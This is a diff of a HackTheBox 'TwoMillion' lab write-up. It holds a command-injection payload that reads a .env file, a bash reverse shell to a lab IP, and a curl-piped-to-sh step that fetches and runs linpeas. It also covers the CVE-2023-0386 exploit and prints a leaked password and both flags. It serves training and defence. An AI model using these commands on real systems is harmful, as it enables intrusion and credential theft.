@@ -124,7 +124,7 @@ TwoMillion | ARTIFACTS
     </section>
     
     <div>
-        <h4 id="write-up-for-the-hackthebox-machine---twomillion">Write-Up for the HackTheBox Machine - TwoMillion</h4>
+        <h4 id="write-up-for-the-hackthebox-machine---twomillion-in-guided-mode">Write-Up for the HackTheBox Machine - TwoMillion in Guided Mode</h4>
 <hr>
 <h4 id="001-scan">001: Scan</h4>
 <p>The victim machine was scanned for potential open ports and services using <code>nmap</code>.
@@ -268,7 +268,6 @@ Which resulted in a command injection probe, that exposed local directories from
 <p>Environment variable values are <code>key:value</code> strings stored by the operating system and made available to running processes.
 Effectively, influencing application behaviors without changing code.</p>
 <p>When probed the <code>.env</code> file on the victim, various <code>key:value</code> pairs showed environment variables linked to the database of the application.</p>
-<p>Command:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;; cat .env #&#34;</span>
 </span></span></code></pre></div><ul>
 <li><code>;</code> | command separator</li>
@@ -289,49 +288,63 @@ Initially, a Netcat listener was setup on the attacker.</p>
 <p align="center">
   <img src="/captures/screens/TwoMillion/shot-019.png" alt="shot-019">
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.15.190/4444 0&gt;&amp;1&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.15.190/4444 0&gt;&amp;1&#39;</span> <span style="color:#75715e">#</span>
 </span></span></code></pre></div><ul>
 <li>bash reverse shell command used in burpsuite json request.</li>
 </ul>
 <p align="center">
   <img src="/captures/screens/TwoMillion/shot-020.png" alt="shot-020">
 </p>
-<p>On the attacker machine a reverse shell connection has been established.</p>
+<p>Successfully established a reverse shell connection on the attacker machine.</p>
 <p align="center">
   <img src="/captures/screens/TwoMillion/shot-021.png" alt="shot-021">
 </p>
 <hr>
-<p>At this point the user we are connected as is www-data. Nevertheless, according to the credentials found in .env we switch to the admin user with su admin and enter the password SuperDuperPass123.</p>
-<p>Thus, we can view the user.txt flag, located in /home/admin.</p>
+<h4 id="013-user-flag">013: User Flag</h4>
+<p>At this point the there is access to the system with a common web server user <code>www-data</code>.
+As admin credentials were found in <code>.env</code>, an attemped was made to switch from the current system user to <code>admin</code> with <code>su admin</code>.
+After entering the password <code>SuperDuperPass123</code>, as assumed the user bacame <code>admin</code>.
+Thus, the user flag can be captured with <code>cat user.txt</code> located in <code>/home/admin</code>.</p>
 <ul>
-<li>e6028d512a774b66d8248d6f3e6cfe82</li>
+<li><code>e6028d512a774b66d8248d6f3e6cfe82</code></li>
 </ul>
 <hr>
-<p>Linpeas Enumeration</p>
-<p>A python listener is set up on the attacker machine, where linpeas.sh is located.</p>
-<p>sudo python3 -m http.server 80</p>
-<p>Hence, we obtain and execute linpeas.sh from the target using curl for a comprehensive system enumeration</p>
-<p>curl &lt;attacker_ip&gt;/linpeas.sh | sh</p>
-<p>As observed there were various findings, but what seemed of interest was an email exchange located in /var/mail. Indicating that the system is potentially vulnerable to CVE-2023-0386</p>
-<p><img src="/captures/screens/TwoMillion/shot-022.png" alt="shot-022"></p>
-<hr>
-<p>CVE-2023-0386 Proof of Concept</p>
-<p>A concise exploitation procedure is found:
-
-<a href="https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c" target="_blank" rel="noopener">https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c</a>
+<h4 id="014-victim-enumeration">014: Victim Enumeration</h4>
+<p>With <code>admin</code> privileges the victim machine was further probed for potential vulnerabilities and misconfigurations with the use of Linpeas.
+Initially, a python server was ran on the attacker, at a location where <code>linpeas.sh</code> is normally located <code>/usr/share/peass/linpeas</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span></code></pre></div><p>Therefore, from the victim&rsquo;s shell a GET request using <code>curl</code> was made to the locally running python server for <code>linpeas.sh</code> and then piped for execution.
+Which eventually after some time, the tool provided a comprehensive system enumeration.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl &lt;attacker_ip&gt;/linpeas.sh | sh
+</span></span></code></pre></div><hr>
+<h4 id="015-privilege-escalation">015: Privilege Escalation</h4>
+<p>As observed there were various findings, but what seemed of interest was an email exchange located in <code>/var/mail</code>. Indicating that the system was potentially vulnerable to <code>CVE-2023-0386</code>.</p>
+<p align="center">
+  <img src="/captures/screens/TwoMillion/shot-022.png" alt="shot-022">
 </p>
-<p>The compilation process requires libfuse for the implemention of the malicious filesystem:</p>
+<p>
+<a href="https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c" target="_blank" rel="noopener">https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c</a>
+ provides a concise exploitation procedure for <code>CVE-2023-0386</code>.</p>
+<p>The compilation process required <code>libfuse</code> for the implemention of the malicious filesystem on the victim.</p>
 <ul>
-<li>apt install libfuse-dev</li>
-<li>gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl</li>
+<li><code>apt install libfuse-dev</code> | required library</li>
+<li><code>gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl</code> | compliation to statically linked executable, allowing large file support, linking against FUSE and dynamic <code>libfuse</code> loading</li>
 </ul>
-<p>Then a local python server is set up on port 9000, for a the download of the exploit on the target machine with the use of curl.</p>
-<p>curl -O http://10.10.15.190:9000/poc</p>
-<p><img src="/captures/screens/TwoMillion/shot-023.png" alt="shot-023"></p>
-<p>All that was required, for the privilege escalation, was to make the scrip executable with chmod +x and then run it.</p>
-<p><img src="/captures/screens/TwoMillion/shot-024.png" alt="shot-024"></p>
-<hr>
-<p>Thus, we become root and have control over the entire system. With the flag captured with cat /root/root.txt</p>
+<p>Then a local python server was locally ran on port 9000, for the download of the exploit on the victim machine with the use of <code>curl</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -O http://1&lt;attacker_ip&gt;:9000/poc
+</span></span></code></pre></div><h5 id="note-command-used-on-the-victim"><em>Note: Command used on the victim&rsquo;s shell</em></h5>
+<p align="center">
+  <img src="/captures/screens/TwoMillion/shot-023.png" alt="shot-023">
+</p>
+<p>All that was required at this stage of the privilege escalation, was to make the script executable with <code>chmod +x</code> and then run it.</p>
+<p align="center">
+  <img src="/captures/screens/TwoMillion/shot-024.png" alt="shot-024">
+</p>
+<p>Thus, the system was fully compromised by becoming root.
+Finally, the root flag captured with <code>cat /root/root.txt</code></p>
+<ul>
+<li><code>b38a9c59680e596efe9f32a089d14b6f</code></li>
+</ul>
     </div>
 </div>
 
